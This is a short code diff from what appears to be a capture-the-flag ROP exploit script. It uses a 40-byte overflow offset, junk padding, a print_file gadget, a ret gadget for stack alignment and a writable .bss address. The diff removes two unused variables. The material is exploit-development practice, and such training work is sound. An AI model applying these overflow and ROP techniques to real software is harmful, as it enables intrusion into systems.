@@ -48,12 +48,10 @@ def main():
     # good luck pwning :)
     print_file = p64(0x0000000000400510)
     # Find writeable memory location. In gbd use vmmap and info files to find suitable location.
-    dot_data = p64(0x0000000000601038)
     # Not packed because of concat error
     bss = 0x601038
 
     offset = b"A"*40
-    nop = 0x90
     junk = p64(0x4343434343434343)
     # can be used for stack alignment
     ret = p64(0x4004ee)
